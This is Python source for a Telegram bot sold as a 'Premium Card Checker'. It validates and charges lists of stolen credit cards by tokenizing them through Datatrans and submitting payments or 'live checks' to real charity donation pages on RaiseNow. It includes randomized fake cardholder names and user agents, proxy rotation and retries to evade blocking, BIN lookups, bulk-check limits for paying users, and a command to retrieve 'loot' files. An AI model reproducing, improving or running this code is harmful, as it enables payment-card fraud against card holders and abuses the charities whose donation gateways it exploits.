            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": "6fe80dce-e221-487a-817e-5e93a1d2119a",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "5000",
                    "suggested_amounts": "[1000,2000,5000]",
                    "user_agent": user_agent
                },
                "solution": {"uuid": "834f9dcc-f4a1-4d56-8aa5-ab21a88d917f", "name": "Syrienhilfe (3476)", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hvtkm?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "custom_parameters": {
                "campaign_id": "",
                "campaign_subid": "",
                "rnw_recurring_interval_name": "monthly",
                "rnw_recurring_interval_text": "Monthly"
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "3b718a2e-be58-48ce-95f5-ff6471108a78",
            "return_url": "https://donate.raisenow.io/hvtkm?lng=en&rnw-view=payment_result"
        }

        # --- CHARGE MODE ---
        if gate3_mode == 'charge':
            charge_value = _get_charge_value('3', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            # Key check y hệt Gate 1
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = {"recurring_interval": "7 * *", "timezone": "Asia/Bangkok"}


            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 3 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 3 System Error: {e}", bin_info

def _check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 9 - Charge or Live Check Mode"""
    gate9_mode = get_gate9_mode()

    try:
        # Generate random data for this request
        user_agent = random_user_agent()
        browser_language = "en-US" # Hardcoded language as requested
        first_name = generate_random_string(random.randint(12, 20)) # Updated name generation
        last_name = generate_random_string(random.randint(10, 20))    # Updated name generation
        cardholder_name = f"{first_name} {last_name}"
        
        # Step 1: Tokenize card (common for both modes)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250805043713003023", # Gate 9 formId
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": browser_language,
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        tokenize_headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "pay.datatrans.com",
            "Origin": "https://pay.datatrans.com",
            "Pragma": "no-cache",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info
        
        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Content-Type": "application/json",
            "Host": "api.raisenow.io",
            "Origin": "https://donate.raisenow.io",
            "Pragma": "no-cache",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }

        base_payload = {
            "account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en", "first_name": first_name, "last_name": last_name,
                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": 2000, "suggested_amounts": [2000, 5000, 10000], "user_agent": user_agent}}
            },
            "solution": {"uuid": "7edeeaf-3394-45d5-b9e8-04fba87af7f7", "name": "Lippuner Scholarship", "type": "donate"},
            "product": {
                "name": "tamaro", "source_url": "https://donate.raisenow.io/jgcnt?lng=en", "uuid": "self-service", "version": "2.16.0",
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
            "payment_information": {"brand_code": "eca", "cardholder": cardholder_name, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id},
            "profile": "de7a9ccb-9e5b-4267-b2dc-5d406ee9a3d0",
            "return_url": "https://donate.raisenow.io/jgcnt?lng=en&rnw-view=payment_result"
        }

        # --- CHARGE MODE ---
        if gate9_mode == 'charge':
            charge_value = _get_charge_value('9', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

        # --- LIVE CHECK MODE ---
        else: # gate9_mode == 'live'
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": 50} # Fixed amount for live check

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 9 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 9 System Error: {e}", bin_info

def check_card(line, cancellation_event=None, custom_charge_amount=None):
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', {}

    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""

    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "Invalid date format (mm/yy or mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Missing '/' in the date part.", {}
    else:
        return 'invalid_format', line, "Invalid format (cc|mm|yy|cvv or cc|mm/yy|cvv).", {}

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    try:
        year_str = ano.strip()
        if len(year_str) == 2:
            full_year = int(f"20{year_str}")
        elif len(year_str) == 4:
            full_year = int(year_str)
        else:
            full_year = 0 
        if full_year < datetime.now().year:
            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
    except ValueError:
        return 'invalid_format', line, "Invalid expiration year.", {}

    if len(ano) == 2: ano = f"20{ano}"
    
    # PROXY USAGE LOGIC
    session = requests.Session()
    
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
        except IndexError:
            logger.warning("Proxy list is empty but proxy usage is enabled.")
            pass # No proxy to use

    # --- END UPDATE ---
    
    bin_info = {}

    try:
        bin_to_check = cc[:6]
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        # Use a random UA for BIN check as well
        bin_headers = {"user-agent": random_user_agent(), "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
        
        if error:
            return 'cancelled' if "cancelled" in error else 'error', line, f"BIN Check Error: {error}", {}
        
        if bin_response:
            response_text_lower = bin_response.text.lower()
            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                return 'decline', line, 'INVALID_BIN_DECLINE', {}
            
            if bin_response.status_code == 200:
                try:
                    data = bin_response.json()
                    if isinstance(data, dict):
                        bin_info.update(data)
                    else:
                        logger.warning(f"BIN API returned non-dictionary data for BIN {bin_to_check}: {data}")
                except json.JSONDecodeError:
                    logger.warning(f"Error parsing JSON from BIN check for BIN {bin_to_check}")

        
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
        
        active_gate = get_active_gate()
        
        # --- MODIFIED: Gate logic is now more dynamic ---
        if active_gate == '4':
            return check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
        elif active_gate == '6':
            return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
        elif active_gate == '7':
            return check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
        elif active_gate == '8':
            # Gate 8 needs access to its mode function and the charge value function
            return check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate8_mode, _get_charge_value, custom_charge_amount)
        else:
            # Fallback for other gates that are still in the main file
            gate_functions = {
                '1': _check_card_gate1,
                '2': _check_card_gate2,
                '3': _check_card_gate3,
                '9': _check_card_gate9,
            }
            # Default to gate 6 if the gate is not found in the local functions
            gate_func = gate_functions.get(active_gate)
            if gate_func:
                 return gate_func(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
            else:
                 # Default to external gate 6 if active_gate is invalid
                 return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)


    except Exception as e:
        logger.error(f"Unknown error in check_card for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Unknown System Error: {e}", bin_info

def check_card_with_retry(line, cancellation_event=None, custom_charge_amount=None):
    """
    Wrapper for check_card to retry on specific HTTP errors.
    Returns: status, original_line, full_response, bin_info, had_persistent_error (bool)
    """
    proxy_config = load_proxies()
    # Retry 20 times if proxy is on, otherwise 10 times.
    max_retries = 20 if proxy_config.get("enabled") and proxy_config.get("proxies") else 10

    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            # Return False for persistent error because the task was cancelled, not due to an HTTP error
            return 'cancelled', line, 'User cancelled', {}, False

        status, original_line, full_response, bin_info = check_card(line, cancellation_event, custom_charge_amount)
        
        # Only retry if proxy is enabled and there's a specific HTTP error
        is_http_error = (
            status == 'error' and 
            ("HTTP Error" in str(full_response) or "Proxy Error" in str(full_response) or "Connection Error" in str(full_response))
        )
        
        if is_http_error and proxy_config.get("enabled") and proxy_config.get("proxies"):
            logger.warning(f"Card {line} encountered a proxied HTTP error. Attempt {attempt + 1}/{max_retries}. Retrying in 2s...")
            time.sleep(2) # Add a small delay before retrying
            continue # Move to the next attempt
        else:
            # Not the target error, or success/failure, return the result immediately
            return status, original_line, full_response, bin_info, False

    # If the loop finishes, it means all retries failed with the HTTP error
    logger.error(f"Card {line} has a persistent HTTP error after {max_retries} attempts.")
    # Return the last error, and the persistent error flag
    error_message = (
        f"Persistent HTTP/Proxy error after {max_retries} attempts. Both Request 1 (Tokenize) and Request 2 (Payment) "
        f"may have failed. Final response from the last attempt: {full_response}"
    )
    return 'error', line, error_message, {}, True


def create_progress_bar(current, total, length=10):
    if total == 0: return "[░░░░░░░░░░] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '█' * filled_len + '░' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- BOT COMMANDS ---
async def start(update, context):
    user = update.effective_user

    if user.id in load_users() or user.id == ADMIN_ID:
        await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** 🤖\n\n"
            "This bot utilizes a powerful `Charge Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**🌟 Upgrade to Premium! 🌟**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "✅ **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "✅ **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"🆔 Your Telegram ID is: `{update.effective_user.id}`")

async def get_help_text(user: User):
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)

    active_gate = get_active_gate()
    active_gate_name = get_formatted_gate_name(active_gate)
    gate_status_line = f"\nℹ️ **Current Card Check Gate:** `{active_gate_name}`"
    
    new_commands = (
        "\n**Website Checker:**\n"
        "🔹 `/site <website.com>`\n"
        "   - *Description:* Checks a single website's info (Gateway, Captcha, etc.).\n\n"
        "🔹 `/sitem`\n"
        "   - *Description:* Checks multiple websites at once (max 10).\n"
    )

    texts = {
        "public": (
            "**Public Command Menu** 🛠️\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "🔹 `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "🔹 `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "🔹 `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** 👤\n"
            "You are authorized! Use these commands:\n\n"
            "**Card Checker:**\n"
            "🔹 `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n\n"
            "🔹 `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n\n"
            "🔹 `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n\n"
            "🔹 `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
            "🔹 `/stop`\n"
            "   - *Description:* Stops your currently running /mass or /multi task.\n"
            f"{new_commands}\n"
            f"💳 **/mass Limit:** `{user_mass_limit}` lines/file.\n"
            f"🌟 **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }

    admin_commands = (
        "**Administrator Command Menu** 👑\n"
        "Full control over the bot with these commands:\n\n"
        "**Bot & Check Management:**\n"
        "🔹 `/on`, `/off` - Turn the bot on/off.\n"
        "🔹 `/status` - Check the status of the payment gates.\n"
        "🔹 `/gate [1-4, 6-9]` - Change the active check gate.\n"
        "🔹 `/setgate <id> <min> <max>` - Set the charge range for a gate.\n"
        "🔹 `/stop <user_id>` - Stop a user's task.\n"
        "🔹 `/cs<amount> <card>` - Check with a custom charge amount.\n\n"
        "**Proxy Management:**\n"
        "🔹 `/onprx`, `/offprx` - Enable/Disable proxy usage.\n"
        "🔹 `/addprx <proxy>` - Add and test a new proxy.\n"
        "🔹 `/deleteprx` - View and delete existing proxies.\n"
        "🔹 `/testprx` - Test the saved proxies.\n\n"
        "**User & Message Management:**\n"
        "🔹 `/add <user_id>`\n"
        "🔹 `/ban <user_id>`\n"
        "🔹 `/show` - View the user list.\n"
        "🔹 `/send <user_id> <message>`\n"
        "🔹 `/sendall <message>`\n\n"
        "**Limit Management:**\n"
        "🔹 `/addlimit <user_id> <number>`\n"
        "🔹 `/addlimitmulti <user_id> <number>`\n\n"
        "**Monitoring & History:**\n"
        "🔹 `/active` - View currently running tasks.\n"
        "🔹 `/showcheck` - View user check statistics.\n"
        "🔹 `/lootfile <user_id>` - Retrieve result files."
    )
    
    if user_id == ADMIN_ID:
        member_help_base = texts['member'].split('💳 **/mass Limit:**')[0].strip()
        return f"{admin_commands}{gate_status_line}\n\n{member_help_base}"
    elif user_id in load_users():
        return f"{texts['member']}{gate_status_line}"
    else:
        return texts['public']

async def help_command(update, context):
    user = update.effective_user
    help_text = await get_help_text(user)
    await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Usage: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"ℹ️ User `{user_to_add}` is already in the list.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"✅ Added user `{user_to_add}`.")
    except ValueError: await update.message.reply_text("❌ Invalid User ID.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Usage: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"🗑 Removed user `{user_to_ban}` and all their logs.")
        else:
            await update.message.reply_text(f"ℹ️ User `{user_to_ban}` not found.")
    except ValueError: await update.message.reply_text("❌ Invalid User ID.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("📭 The user list is empty."); return
    
    message_lines = ["👥 **User ID & Limits List:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: `/addlimit <user_id> <lines_to_add>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid data. Please ensure the ID and amount are numbers."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"✅ **/mass Limit Updated Successfully!**\n\n"
                                          f"👤 **User ID:** `{target_user_id_str}`\n"
                                          f"📈 **Old Limit:** `{old_limit}`\n"
                                          f"➕ **Added:** `{amount_to_add}`\n"
                                          f"📊 **New Total:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: `/addlimitmulti <user_id> <cards_to_add>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid data. Please ensure the ID and amount are numbers."); return

    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    
    await update.message.reply_text(f"✅ **/multi Limit Updated Successfully!**\n\n"
                                          f"👤 **User ID:** `{target_user_id_str}`\n"
                                          f"📈 **Old Limit:** `{old_limit}`\n"
                                          f"➕ **Added:** `{amount_to_add}`\n"
                                          f"📊 **New Total:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"You are not authorized to use this command. Please contact the Admin: {ADMIN_USERNAME}")
        return

    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Please provide a valid BIN (6-8 digits).\nUsage: `/bin <bin_number>`")
        return
    
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"⏳ Checking BIN `{bin_to_check}`...")

    try:
        session = requests.Session()
        ua = random_user_agent()
        session.headers.update({"User-Agent": ua})
        
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)

        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
            await msg.edit_text(f"❌ No information found for BIN `{bin_to_check}`."); return

        bin_info = bin_response.json()

        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None'
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)

        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " – ".join(bin_info_parts)
        
        response_text = (
            f"🆔 **BIN:** {bin_info_line}\n"
            f"🏛️ **Bank:** {bank}\n"
            f"🌐 **Country:** {country_name} {flag}"
        )

        final_message = f"ℹ️ **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)

    except json.JSONDecodeError:
        await msg.edit_text(f"❌ Error parsing data from the API for BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"Error in /bin: {e}", exc_info=True)
        await msg.edit_text(f"⛔️ **System Error:** `{e}`")

async def _process_single_check(update, context, line, custom_charge_amount=None):
    """Function to handle the check logic for both /cs and /cs<amount>"""
    msg = await update.message.reply_text("⏳ *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(
            check_card, line, custom_charge_amount=custom_charge_amount
        )
        duration = time.time() - start_time

        user = update.effective_user
        if status in ['error', 'unknown'] and user.id != ADMIN_ID:
            debug_info = f"🐞 DEBUG ALERT (/cs from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
            await context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)

        active_gate = get_active_gate()
        gate_name = get_formatted_gate_name(active_gate)
        
        # If it's a custom charge command, override the gate name
        if custom_charge_amount is not None:
            amount_in_usd = custom_charge_amount / 100.0
            gate_name = f"Custom Charge {amount_in_usd:.2f}$ (Gate {active_gate})"

        # Determine if the current mode is a charge mode to apply the requested change
        is_charge_mode = False
        if active_gate in ['4', '6']:
            is_charge_mode = True
        elif active_gate == '1' and get_gate1_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '2' and get_gate2_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '3' and get_gate3_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '8' and get_gate8_mode() == 'charge':
            is_charge_mode = True
        elif active_gate == '9' and get_gate9_mode() == 'charge':
            is_charge_mode = True
        if custom_charge_amount is not None: # Admin custom charge is also a charge mode
            is_charge_mode = True

        if status == 'gate_dead':
            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: ❌ GATE DIED**\n"
                             f"**💬 Response:** `The payment gateway is currently down (Forbidden). Please contact the admin.`\n\n"
                             f"**🏦 Gateway:** `{gate_name}`\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
            await msg.edit_text(final_message)
            return

        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
        is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
        is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'
        is_card_not_allowed_decline = status == 'decline' and full_response == 'CARD_NOT_ALLOWED_DECLINE'

        if is_invalid_bin_decline:
            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: ❌ DECLINED**\n"
                             f"**💬 Response:** `Invalid Card Number (BIN not found)`\n\n"
                             f"**🏦 Gateway:** `BIN Check`\n\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
        elif is_invalid_cardnumber_decline:
            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: ❌ DECLINED**\n"
                             f"**💬 Response:** `Invalid Card Number`\n\n"
                             f"**🏦 Gateway:** `Datatrans Tokenize`\n\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
        elif is_card_not_allowed_decline:
            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: ❌ DECLINED**\n"
                             f"**💬 Response:** `Card Not Supported`\n\n"
                             f"**🏦 Gateway:** `Datatrans Tokenize`\n\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
        elif is_expired_card_decline:
            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                             f"**💳 Card:** `{original_line}`\n"
                             f"**🚦 Status: ❌ DECLINED**\n"
                             f"**💬 Response:** `Card Expired`\n\n"
                             f"**🏦 Gateway:** `Pre-Check`\n\n"
                             f"**⏱️ Took:** `{duration:.2f}s`\n\n"
                             f"👤 *Checker by: {ADMIN_USERNAME}*")
